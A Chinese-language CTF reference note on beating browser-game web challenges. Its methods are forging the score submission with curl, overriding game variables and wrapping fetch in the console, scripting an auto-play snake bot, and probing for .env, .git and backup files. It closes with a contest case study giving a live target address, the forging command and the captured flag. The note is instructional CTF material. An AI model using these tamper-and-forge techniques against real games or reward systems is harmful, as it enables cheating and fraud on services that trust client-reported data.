# 浏览器游戏/交互式Web CTF解题参考

## 典型题目模式

"玩游戏得flag" — 贪吃蛇/打砖块/flappy bird等，达到目标分后客户端POST score到服务端获取flag。

## 解题思路（按优先级）

### 1. 直接伪造请求（最快）

分析JS源码找到score提交端点，直接curl POST：

```bash
curl -s -X POST 'http://TARGET/index.php' -F 'score=300'
```

关键检查点：
- 服务端是否校验签名/token → 无则直接伪造
- score是否有上限校验 → 通常无，score=99999也行
- 是否需要session → 多数不需要，但带session更稳

### 2. 浏览器Console注入（当curl的flag被平台拒时）

有些CTF平台检测flag来源，浏览器内获取的flag可能不同：

```javascript
// 停止游戏
clearInterval(gameLoop);

// 直接改分
score = 300;
document.getElementById('score').innerText = '300';

// 拦截fetch看原始响应
let origFetch = window.fetch;
window.fetch = function(url, opts) {
    return origFetch.call(this, url, opts).then(response => {
        return response.clone().text().then(body => {
            console.log('RESPONSE:', body);
            return response;
        });
    });
};

// 触发提交
checkWin(300);
```

### 3. 自动玩游戏（最后手段）

当服务端有反作弊（如需要实际游戏帧序列）：

```javascript
clearInterval(gameLoop);
// 加速游戏循环
gameLoop = setInterval(draw, 10); // 10ms instead of 200ms
// 需要注入auto-play逻辑（贪吃蛇：向食物方向移动+避障）
```

## 贪吃蛇Auto-Play Bot模板

```javascript
clearInterval(gameLoop);
snake = [{x: 9*box, y: 10*box}];
score = 0;
d = "RIGHT";
food = {x: 10*box, y: 10*box};

// 简单螺旋路径（避免撞墙）
let path = [];
for (let i = 0; i < 20; i++) {
    for (let j = 0; j < 19; j++) path.push("RIGHT");
    path.push("DOWN");
    for (let j = 0; j < 19; j++) path.push("LEFT");
    path.push("DOWN");
}
let step = 0;
function autoPlay() {
    if (step < path.length && score < 300) {
        d = path[step++];
    }
}
// Override draw
let origDraw = draw;
draw = function() { autoPlay(); origDraw(); };
gameLoop = setInterval(draw, 50);
```

## Flag被拒时的系统排查

| 尝试格式 | 说明 |
|---|---|
| `flag{xxx}` | 原样 |
| `xxx` | 去掉flag{}包裹 |
| `FLAG{XXX}` | 全大写 |
| `flag[xxx]` | 方括号变体 |
| `ctf{xxx}` | 不同前缀 |
| `md5hash` | 仅hash部分 |

## 服务端验证要点

| 检查项 | 方法 |
|---|---|
| Session绑定 | 对比有/无cookie的响应 |
| Content-Type | FormData vs JSON vs URL-encoded |
| Headers | X-Requested-With, Referer, Origin |
| 响应头 | Set-Cookie, X-Powered-By, Server |
| 备份文件 | .phps / .bak / .git / .env |

## 实战案例：贪吃蛇题 (御网杯2026)

- 目标: 120.27.146.76:22226
- 技术: Apache/2.4.54 + PHP/7.4.33
- 漏洞: checkWin(score) 通过FormData POST score到index.php，无签名校验
- 获取: `curl -s -X POST 'http://120.27.146.76:22226/index.php' -F 'score=300'`
- Flag: flag{5cf1ef3539860b778211db423b4f6558}
- 教训: 该flag在服务端返回正确但竞赛平台显示错误 → 需检查flag格式/来源
